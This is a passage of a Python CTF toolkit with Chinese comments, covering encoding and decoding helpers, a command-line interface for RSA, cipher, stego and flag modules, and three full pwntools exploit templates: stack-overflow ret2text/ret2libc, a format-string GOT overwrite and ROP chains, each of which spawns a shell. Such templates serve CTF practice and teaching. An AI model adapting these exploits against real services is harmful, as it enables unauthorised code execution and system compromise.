        if isinstance(data, str):
            data = data.encode()
        return base64.b32encode(data).decode()

    @staticmethod
    def base32_decode(data):
        """Base32 解码"""
        if isinstance(data, str):
            data = data.encode()
        # 自动补全padding
        missing = len(data) % 8
        if missing:
            data += b'=' * (8 - missing)
        return base64.b32decode(data)

    @staticmethod
    def base58_encode(data):
        """Base58 编码"""
        try:
            import base58
        except ImportError:
            print("[-] 需要安装base58库: pip install base58")
            return None
        if isinstance(data, str):
            data = data.encode()
        return base58.b58encode(data).decode()

    @staticmethod
    def base58_decode(data):
        """Base58 解码"""
        try:
            import base58
        except ImportError:
            print("[-] 需要安装base58库: pip install base58")
            return None
        if isinstance(data, str):
            data = data.encode()
        return base58.b58decode(data)

    @staticmethod
    def base64_encode(data):
        """Base64 编码"""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64encode(data).decode()

    @staticmethod
    def base64_decode(data):
        """Base64 解码"""
        if isinstance(data, str):
            data = data.encode()
        # 自动补全padding
        missing = len(data) % 4
        if missing:
            data += b'=' * (4 - missing)
        return base64.b64decode(data)

    @staticmethod
    def base85_encode(data):
        """Base85 (Ascii85) 编码"""
        if isinstance(data, str):
            data = data.encode()
        return base64.a85encode(data).decode()

    @staticmethod
    def base85_decode(data):
        """Base85 (Ascii85) 解码"""
        if isinstance(data, str):
            data = data.encode()
        return base64.a85decode(data)

    @staticmethod
    def url_encode(data):
        """URL编码"""
        from urllib.parse import quote
        return quote(data)

    @staticmethod
    def url_decode(data):
        """URL解码（支持多重编码）"""
        from urllib.parse import unquote
        result = data
        for _ in range(10):  # 最多解码10层
            decoded = unquote(result)
            if decoded == result:
                break
            result = decoded
        return result

    @staticmethod
    def morse_decode(data):
        """
        摩斯电码解码

        参数:
            data: 摩斯电码字符串
                  字母间用空格分隔，单词间用 / 或多个空格分隔
        返回:
            str: 解码后的文本
        """
        # 统一分隔符
        data = data.strip()
        words = re.split(r'\s*/\s*|\s{2,}', data)

        result = ""
        for word in words:
            letters = word.strip().split()
            for letter in letters:
                if letter in CodecToolkit.MORSE_TABLE:
                    result += CodecToolkit.MORSE_TABLE[letter]
                else:
                    result += '?'
            result += ' '

        return result.strip()

    @staticmethod
    def morse_encode(data):
        """摩斯电码编码"""
        reverse_morse = {v: k for k, v in CodecToolkit.MORSE_TABLE.items()}
        result = []
        for char in data.upper():
            if char in reverse_morse:
                result.append(reverse_morse[char])
            elif char == ' ':
                result.append('/')
        return ' '.join(result)

    @staticmethod
    def hex_encode(data):
        """Hex编码"""
        if isinstance(data, str):
            data = data.encode()
        return data.hex()

    @staticmethod
    def hex_decode(data):
        """Hex解码"""
        if isinstance(data, str):
            data = data.encode()
        # 去除空格和0x前缀
        data = data.replace(b' ', b'').replace(b'0x', b'').replace(b'0X', b'')
        return binascii.unhexlify(data)

    @staticmethod
    def auto_decode(data):
        """
        自动识别并解码

        尝试多种编码方式，返回所有成功解码的结果

        参数:
            data: 待解码的字符串
        返回:
            list: [(编码名称, 解码结果), ...]
        """
        results = []
        decoders = [
            ('Base16', CodecToolkit.base16_decode),
            ('Base32', CodecToolkit.base32_decode),
            ('Base58', CodecToolkit.base58_decode),
            ('Base64', CodecToolkit.base64_decode),
            ('Base85', CodecToolkit.base85_decode),
            ('URL', CodecToolkit.url_decode),
            ('Hex', CodecToolkit.hex_decode),
        ]

        for name, decoder in decoders:
            try:
                decoded = decoder(data)
                if decoded:
                    # 尝试转换为字符串
                    try:
                        text = decoded.decode('utf-8')
                        if all(32 <= ord(c) < 127 or c in '\n\r\t' for c in text):
                            results.append((name, text))
                    except:
                        # 二进制数据
                        if len(decoded) > 0:
                            results.append((name, decoded))
            except:
                pass

        # 检查摩斯电码
        if set(data.strip()) <= {'.', '-', ' ', '/', '\t'}:
            try:
                morse_result = CodecToolkit.morse_decode(data)
                if morse_result and '?' not in morse_result[:5]:
                    results.append(('Morse', morse_result))
            except:
                pass

        return results


# ============================================================================
# 第七部分：pwntools风格exploit模板
# ============================================================================

class ExploitTemplates:
    """
    pwntools风格exploit模板

    提供常用的漏洞利用模板:
    - 栈溢出 exploit (ret2text, ret2libc)
    - 格式化字符串 exploit
    - ROP链构造
    """

    @staticmethod
    def stack_overflow_template():
        """
        栈溢出exploit模板

        演示:
        1. ret2text: 直接跳转到后门函数
        2. ret2libc: 泄露libc基址后调用system("/bin/sh")
        """
        template = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
栈溢出exploit模板
=================
适用场景: 程序存在栈溢出漏洞
保护要求: 根据保护机制选择不同的利用方式
"""

from pwn import *

# ==================== 配置 ====================
context(arch='amd64', os='linux', log_level='debug')

# 目标信息
REMOTE_HOST = 'ctf.challenge.com'
REMOTE_PORT = 9999
BINARY_PATH = './pwn_binary'

# 加载ELF文件
elf = ELF(BINARY_PATH)

# ==================== ret2text 模板 ====================
def exploit_ret2text():
    """
    ret2text: NX未开启或程序中有后门函数时使用
    直接覆盖返回地址跳转到后门函数
    """
    # 连接目标
    p = remote(REMOTE_HOST, REMOTE_PORT)
    # 本地调试: p = process(BINARY_PATH)

    # 后门函数地址（通过IDA分析获得）
    backdoor_addr = elf.symbols.get('backdoor', 0x4011b6)

    # 计算溢出偏移
    # 方法1: pattern_offset
    # 方法2: IDA分析缓冲区大小
    buffer_size = 0x40  # 缓冲区大小
    offset = buffer_size + 8  # 加上saved rbp

    # 构造payload
    payload = b'A' * offset
    payload += p64(backdoor_addr)

    # 发送payload
    p.sendline(payload)

    # 获取shell
    p.interactive()


# ==================== ret2libc 模板 ====================
def exploit_ret2libc():
    """
    ret2libc: NX开启时使用
    步骤1: 泄露libc函数地址
    步骤2: 计算libc基址
    步骤3: 调用system("/bin/sh")
    """
    p = remote(REMOTE_HOST, REMOTE_PORT)

    # 查找gadget
    # ROPgadget --binary pwn_binary | grep "pop rdi"
    pop_rdi_ret = 0x401233  # 替换为实际地址
    ret_gadget = 0x40101a  # ret指令，用于栈对齐

    # 第一段: 泄露puts地址
    offset = 0x48  # 溢出偏移

    payload1 = b'A' * offset
    payload1 += p64(pop_rdi_ret)     # pop rdi; ret
    payload1 += p64(elf.got['puts']) # puts的GOT地址 → rdi
    payload1 += p64(elf.plt['puts']) # 调用puts打印GOT内容
    payload1 += p64(elf.symbols['main'])  # 返回main

    p.sendline(payload1)

    # 接收泄露的地址
    leaked = p.recv(6)
    puts_addr = u64(leaked.ljust(8, b'\\x00'))
    log.info(f"泄露的puts地址: {hex(puts_addr)}")

    # 计算libc基址（需要远程libc）
    # 使用LibcSearcher或手动查询
    # from LibcSearcher import LibcSearcher
    # libc = LibcSearcher('puts', puts_addr)
    # libc_base = puts_addr - libc.dump('puts')

    # 假设已知libc偏移
    libc = ELF('./libc.so.6')
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh\\x00'))

    log.info(f"libc基址: {hex(libc_base)}")
    log.info(f"system地址: {hex(system_addr)}")

    # 第二段: 调用system("/bin/sh")
    payload2 = b'A' * offset
    payload2 += p64(ret_gadget)     # 栈对齐
    payload2 += p64(pop_rdi_ret)
    payload2 += p64(binsh_addr)
    payload2 += p64(system_addr)

    p.sendline(payload2)
    p.interactive()


if __name__ == '__main__':
    # 选择利用方式
    # exploit_ret2text()  # 简单模式
    exploit_ret2libc()    # 进阶模式
'''
        print(template)
        return template

    @staticmethod
    def format_string_template():
        """
        格式化字符串exploit模板

        演示:
        1. 确定格式化字符串偏移
        2. 泄露栈数据
        3. 任意地址写
        """
        template = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
格式化字符串exploit模板
=====================
适用场景: printf(user_input) 类漏洞
"""

from pwn import *

context(arch='amd64', os='linux', log_level='debug')

REMOTE_HOST = 'ctf.challenge.com'
REMOTE_PORT = 9999
BINARY_PATH = './pwn_binary'

elf = ELF(BINARY_PATH)
p = remote(REMOTE_HOST, REMOTE_PORT)

# ==================== 步骤1: 确定偏移 ====================
def find_offset():
    """确定格式化字符串在栈上的偏移"""
    p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
    result = p.recvline()
    # 找到0x41414141出现的位置
    for i, part in enumerate(result.split(b'.')):
        if b'41414141' in part or b'0x41414141' in part:
            return i + 1
    return None

offset = find_offset()
log.info(f"格式化字符串偏移: {offset}")

# ==================== 步骤2: 泄露信息 ====================
def leak_address(offset):
    """泄露栈上的地址信息"""
    # 泄露canary
    p.sendline(f'%{offset + 5}$p'.encode())
    canary = int(p.recvline().strip(), 16)
    log.info(f"Canary: {hex(canary)}")

    # 泄露libc地址
    p.sendline(f'%{offset + 15}$p'.encode())
    libc_addr = int(p.recvline().strip(), 16)
    log.info(f"libc地址: {hex(libc_addr)}")

    return canary, libc_addr

# ==================== 步骤3: 任意地址写 ====================
def fmt_write(offset, target_addr, value):
    """使用格式化字符串写入指定地址"""
    # 方法1: 使用pwntools的fmtstr_payload
    payload = fmtstr_payload(offset, {target_addr: value}, write_size='byte')
    p.sendline(payload)

# ==================== 步骤4: 覆写GOT表 ====================
def overwrite_got(offset):
    """覆写printf的GOT表为system地址"""
    printf_got = elf.got['printf']
    system_addr = elf.symbols.get('system', 0x401234)

    # 使用fmtstr_payload自动构造
    payload = fmtstr_payload(offset, {printf_got: system_addr}, write_size='short')
    p.sendline(payload)

    # 再次输入触发system
    p.sendline(b'/bin/sh\\x00')
    p.interactive()

if __name__ == '__main__':
    overwrite_got(offset)
'''
        print(template)
        return template

    @staticmethod
    def rop_chain_template():
        """
        ROP链构造模板

        演示:
        1. 使用ROPgadget查找gadget
        2. 构造多段ROP链
        3. 使用pwntools的ROP模块
        """
        template = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROP链构造模板
============
适用场景: NX开启，需要构造ROP链绕过保护
"""

from pwn import *

context(arch='amd64', os='linux', log_level='info')

REMOTE_HOST = 'ctf.challenge.com'
REMOTE_PORT = 9999
BINARY_PATH = './pwn_binary'
LIBC_PATH = './libc.so.6'

elf = ELF(BINARY_PATH)
libc = ELF(LIBC_PATH)
p = remote(REMOTE_HOST, REMOTE_PORT)

# ==================== 方法1: 手动构造ROP链 ====================
def manual_rop():
    """手动构造ROP链"""
    # 使用ROPgadget查找gadget
    # ROPgadget --binary pwn_binary | grep "pop rdi"
    pop_rdi = 0x401233        # pop rdi; ret
    pop_rsi_r15 = 0x401231   # pop rsi; pop r15; ret
    ret = 0x40101a           # ret (栈对齐)

    offset = 0x48

    # 第一段: 泄露libc
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    p.sendline(payload)

    # 接收泄露
    leaked = u64(p.recv(6).ljust(8, b'\\x00'))
    libc_base = leaked - libc.symbols['puts']

    # 第二段: system("/bin/sh")
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh\\x00'))

    payload2 = b'A' * offset
    payload2 += p64(ret)         # 栈对齐
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system)

    p.sendline(payload2)
    p.interactive()

# ==================== 方法2: 使用pwntools ROP模块 ====================
def auto_rop():
    """使用pwntools的ROP模块自动构造"""
    rop = ROP(elf)

    # 自动查找gadget
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    # 自动构造ROP链
    rop.raw(ret)                           # 栈对齐
    rop.call(elf.symbols['puts'], [elf.got['puts']])  # 泄露puts
    rop.call(elf.symbols['main'])          # 返回main

    offset = 0x48
    payload = b'A' * offset + rop.chain()
    p.sendline(payload)

    # 接收泄露
    leaked = u64(p.recv(6).ljust(8, b'\\x00'))
    libc_base = leaked - libc.symbols['puts']

    # 构造第二段
    rop2 = ROP(elf)
    rop2.raw(ret)
    rop2.raw(pop_rdi)
    rop2.raw(libc_base + next(libc.search(b'/bin/sh\\x00')))
    rop2.raw(libc_base + libc.symbols['system'])

    payload2 = b'A' * offset + rop2.chain()
    p.sendline(payload2)
    p.interactive()

if __name__ == '__main__':
    auto_rop()
'''
        print(template)
        return template


# ============================================================================
# 主函数：命令行接口
# ============================================================================

def main():
    """命令行入口"""
    parser = argparse.ArgumentParser(
        description='CTF夺旗赛实战工具包',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # RSA共模攻击
  python ctf_toolkit.py --module rsa --attack common_modulus \\
    --n 0x1234 --e1 65537 --c1 0x5678 --e2 65539 --c2 0x9abc

  # RSA低指数攻击
  python ctf_toolkit.py --module rsa --attack low_exponent \\
    --n 0x1234 --e 3 --c 0x5678

  # Wiener攻击
  python ctf_toolkit.py --module rsa --attack wiener \\
    --n 0x1234 --e 0x5678

  # 凯撒密码破解
  python ctf_toolkit.py --module classical --cipher caesar \\
    --text "iodj{fdhvdu_flskhu}"

  # Base64解码
  python ctf_toolkit.py --module codec --decode base64 \\
    --text "ZmxhZ3t0ZXN0fQ=="

  # LSB隐写提取
  python ctf_toolkit.py --module stego --action lsb --file image.png

  # 查看exploit模板
  python ctf_toolkit.py --module exploit --template stack_overflow
"""
    )

    parser.add_argument('--module', type=str,
                        choices=['flag', 'rsa', 'padding_oracle', 'classical',
                                 'stego', 'codec', 'exploit'],
                        help='选择工具模块')
    parser.add_argument('--attack', type=str, help='攻击方法名称')
    parser.add_argument('--action', type=str, help='操作名称')
    parser.add_argument('--n', type=str, help='RSA模数 (hex或dec)')
    parser.add_argument('--e', type=str, help='RSA公钥指数')
    parser.add_argument('--e1', type=str, help='RSA公钥指数1')
    parser.add_argument('--e2', type=str, help='RSA公钥指数2')
    parser.add_argument('--c', type=str, help='RSA密文 (hex或dec)')
    parser.add_argument('--c1', type=str, help='RSA密文1')
    parser.add_argument('--c2', type=str, help='RSA密文2')
    parser.add_argument('--cipher', type=str, help='密码类型')
    parser.add_argument('--text', type=str, help='待处理的文本')
    parser.add_argument('--decode', type=str, help='解码方式')
    parser.add_argument('--encode', type=str, help='编码方式')
    parser.add_argument('--file', type=str, help='文件路径')
    parser.add_argument('--template', type=str, help='exploit模板类型')
    parser.add_argument('--flag', type=str, help='Flag字符串')

    args = parser.parse_args()

    # 辅助函数：将字符串转换为大整数
    def str_to_int(s):
        s = s.strip()
        if s.startswith('0x') or s.startswith('0X'):
            return int(s, 16)
        return int(s)

    # RSA模块
    if args.module == 'rsa':
        if args.attack == 'common_modulus':
            n = str_to_int(args.n)
            e1 = str_to_int(args.e1)
            c1 = str_to_int(args.c1)
            e2 = str_to_int(args.e2)
            c2 = str_to_int(args.c2)
            RSAAttacker.common_modulus_attack(n, e1, c1, e2, c2)

        elif args.attack == 'low_exponent':
            n = str_to_int(args.n)
            e = str_to_int(args.e)
            c = str_to_int(args.c)
            RSAAttacker.low_exponent_attack(c, e, n)

        elif args.attack == 'wiener':
            n = str_to_int(args.n)
            e = str_to_int(args.e)
            d = RSAAttacker.wiener_attack(e, n)
            if d:
                c = str_to_int(args.c) if args.c else 0
                if c:
                    m = pow(c, d, n)
                    print(f"[+] 明文: {RSAAttacker.long_to_bytes(m)}")

        elif args.attack == 'fermat':
            n = str_to_int(args.n)
            result = RSAAttacker.fermat_factorization(n)
            if result:
                p, q = result
                print(f"  p = {p}")
                print(f"  q = {q}")
        else:
            print("可用的RSA攻击: common_modulus, low_exponent, wiener, fermat")

    # 古典密码模块
    elif args.module == 'classical':
        if not args.text:
            print("[-] 请通过 --text 指定密文")
            return

        if args.cipher == 'caesar':
            ClassicalCipherCracker.caesar_crack(args.text)
        elif args.cipher == 'vigenere':
            ClassicalCipherCracker.vigenere_crack(args.text)
        elif args.cipher == 'rail_fence':
            ClassicalCipherCracker.rail_fence_crack(args.text)
        elif args.cipher == 'affine':
            ClassicalCipherCracker.affine_crack(args.text)
        else:
            print("可用的密码: caesar, vigenere, rail_fence, affine")

    # 编码解码模块
    elif args.module == 'codec':
        if not args.text:
            print("[-] 请通过 --text 指定文本")
            return

        if args.decode:
            decoders = {
                'base16': CodecToolkit.base16_decode,
                'base32': CodecToolkit.base32_decode,
                'base58': CodecToolkit.base58_decode,
                'base64': CodecToolkit.base64_decode,
                'base85': CodecToolkit.base85_decode,
                'url': CodecToolkit.url_decode,
                'hex': CodecToolkit.hex_decode,
                'morse': CodecToolkit.morse_decode,
                'auto': lambda x: CodecToolkit.auto_decode(x),
            }

            if args.decode in decoders:
                if args.decode == 'auto':
                    results = CodecToolkit.auto_decode(args.text)
                    for name, result in results:
                        if isinstance(result, str):
                            print(f"[{name}] {result}")
                        else:
                            print(f"[{name}] {result}")
                else:
                    try:
                        result = decoders[args.decode](args.text)
                        if isinstance(result, bytes):
                            try:
                                result = result.decode()
                            except:
                                result = result.hex()
                        print(f"[+] 解码结果: {result}")
                    except Exception as e:
                        print(f"[-] 解码失败: {e}")
            else:
                print(f"不支持的解码: {args.decode}")
                print(f"可用: {', '.join(decoders.keys())}")

        elif args.encode:
            encoders = {
                'base16': CodecToolkit.base16_encode,
                'base32': CodecToolkit.base32_encode,
                'base58': CodecToolkit.base58_encode,
                'base64': CodecToolkit.base64_encode,
                'base85': CodecToolkit.base85_encode,
                'url': CodecToolkit.url_encode,
                'hex': CodecToolkit.hex_encode,
                'morse': CodecToolkit.morse_encode,
            }

            if args.encode in encoders:
                result = encoders[args.encode](args.text)
                print(f"[+] 编码结果: {result}")
            else:
                print(f"不支持的编码: {args.encode}")

    # 隐写分析模块
    elif args.module == 'stego':
        if not args.file:
            print("[-] 请通过 --file 指定文件路径")
            return

        if args.action == 'lsb':
            StegoAnalyzer.lsb_extract(args.file)
        elif args.action == 'trailing':
            StegoAnalyzer.extract_trailing_data(args.file)
        elif args.action == 'zip_fake':
            StegoAnalyzer.check_zip_fake_encryption(args.file)
        elif args.action == 'zip_fix':
            output = args.file.replace('.zip', '_fixed.zip')
            StegoAnalyzer.fix_zip_fake_encryption(args.file, output)
        else:
            print("可用操作: lsb, trailing, zip_fake, zip_fix")

    # exploit模板模块
    elif args.module == 'exploit':
        if args.template == 'stack_overflow':
            ExploitTemplates.stack_overflow_template()
        elif args.template == 'format_string':
            ExploitTemplates.format_string_template()
        elif args.template == 'rop_chain':
            ExploitTemplates.rop_chain_template()
        else:
            print("可用模板: stack_overflow, format_string, rop_chain")

    # Flag提交模块
    elif args.module == 'flag':
        if not args.flag:
            print("[-] 请通过 --flag 指定Flag")
            return

        submitter = FlagSubmitter(platform='generic')
        result = submitter.submit(args.flag)
        print(f"结果: {result['message']}")
        submitter.print_stats()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
